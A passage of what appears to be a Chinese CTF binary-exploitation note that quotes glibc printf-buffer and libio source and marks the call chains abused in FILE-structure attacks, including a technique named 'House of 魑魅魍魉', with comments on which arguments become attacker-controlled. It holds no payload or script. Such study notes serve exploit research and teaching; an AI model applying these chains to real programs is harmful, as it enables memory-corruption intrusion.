+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__printf_buffer_as_file_commit</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__printf_buffer_as_file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">assert</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">stream</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">assert</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">stream</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">&lt;=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_end</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">assert</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">stream</span><span class="p">.</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">assert</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">stream</span><span class="p">.</span><span class="n">_IO_write_end</span> <span class="o">==</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_end</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_ptr</span> <span class="o">=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">stream</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入<code>__printf_buffer_flush</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define Xprintf(n) __printf_##n
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define Xprintf_buffer_flush Xprintf (buffer_flush)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define Xprintf_buffer Xprintf (buffer)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">Xprintf_buffer_flush</span> <span class="p">(</span><span class="k">struct</span> <span class="n">Xprintf_buffer</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">Xprintf_buffer_has_failed</span> <span class="p">(</span><span class="n">buf</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">  <span class="n">Xprintf</span> <span class="p">(</span><span class="n">buffer_do_flush</span><span class="p">)</span> <span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// 此处调用__printf_buffer_do_flush(buf)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>__printf_buffer_do_flush</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__printf_buffer_do_flush</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__printf_buffer</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">mode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_failed</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_sprintf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_snprintf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_snprintf</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_snprintf</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_sprintf_chk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__chk_fail</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_to_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_to_file</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_to_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_asprintf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_asprintf</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_asprintf</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_dprintf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_dprintf</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_dprintf</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_strfmon</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">E2BIG</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_mark_failed</span> <span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_fp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_fp</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_fp</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_fp_to_wide</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_fp_to_wide</span>
+</span></span><span class="line"><span class="cl">        <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_fp_to_wide</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_fphex_to_wide</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_buffer_flush_fphex_to_wide</span>
+</span></span><span class="line"><span class="cl">        <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_fphex_to_wide</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">__printf_buffer_mode_obstack</span><span class="p">:</span> <span class="c1">// 进入该 case
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">__printf_buffer_flush_obstack</span> <span class="p">((</span><span class="k">struct</span> <span class="n">__printf_buffer_obstack</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__builtin_trap</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用<code>__printf_buffer_flush_obstack</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__printf_buffer_flush_obstack</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__printf_buffer_obstack</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">.</span><span class="n">written</span> <span class="o">+=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">.</span><span class="n">write_ptr</span> <span class="o">-</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">.</span><span class="n">write_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">.</span><span class="n">write_ptr</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">obstack_1grow</span> <span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">obstack</span><span class="p">,</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">ch</span><span class="p">);</span> <span class="c1">// 调用该函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// 后续IO利用调用链为
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// _obstack_newchunk (__o, 1);  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// new_chunk = CALL_CHUNKFUN (h, new_size);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="c1">// (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250127213018398.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250127213018398"
+	
+	
+></p>
 <h4 id="house-of-魑魅魍魉">House of 魑魅魍魉</h4>
+<ul>
+<li>&lt;glibc-2.37</li>
+<li><code>_IO_helper_jumps</code> ，根据COMPILE_WPRINTF不同而生成不同的跳转表，实际程序中有2个表</li>
+<li><code>COMPILE_WPRINTF == 0</code> 先生成，<code>COMPILE_WPRINTF == 1</code> 后生成</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifdef COMPILE_WPRINTF
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_helper_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_wdefault_finish</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_helper_overflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_default_underflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">)</span> <span class="n">_IO_wdefault_pbackfail</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_wdefault_xsputn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_wdefault_xsgetn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_default_seekoff</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_default_setbuf</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_default_sync</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_wdefault_doallocate</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_default_read</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_default_write</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_default_seek</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_default_close</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_default_stat</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#else
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_helper_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_default_finish</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_helper_overflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_default_underflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_default_xsputn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_default_xsgetn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_default_seekoff</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_default_setbuf</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_default_sync</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_default_doallocate</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_default_read</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_default_write</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_default_seek</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_default_close</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span> <span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_default_stat</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>不同 <code>COMPILE_WPRINTF</code> 对应 <code>helper_file</code> 也不同，区别在于是否需要伪造 <code>struct _IO_wide_data _wide_data;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">helper_file</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">_f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef COMPILE_WPRINTF
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="n">_wide_data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="n">FILE</span> <span class="o">*</span><span class="n">_put_stream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef _IO_MTSAFE_IO
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="n">_IO_lock_t</span> <span class="n">lock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理</strong></p>
+<ul>
+<li>利用 <code>COMPILE_WPRINTF == 1</code> 的 <code>_IO_helper_overflow</code> ，攻击过程中该函数用于控制 <code>_IO_default_xsputn</code> 的三个参数</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">_IO_helper_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">helper_file</span><span class="o">*</span><span class="p">)</span> <span class="n">s</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_put_stream</span><span class="p">;</span> <span class="c1">// 第一个参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#ifdef COMPILE_WPRINTF
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="c1">// 第三个参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">used</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">used</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 利用这个链，三个参数都可控
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">size_t</span> <span class="n">written</span> <span class="o">=</span> <span class="n">_IO_sputn</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span> <span class="n">used</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">written</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">written</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__wmemmove</span> <span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">+</span> <span class="n">written</span><span class="p">,</span>
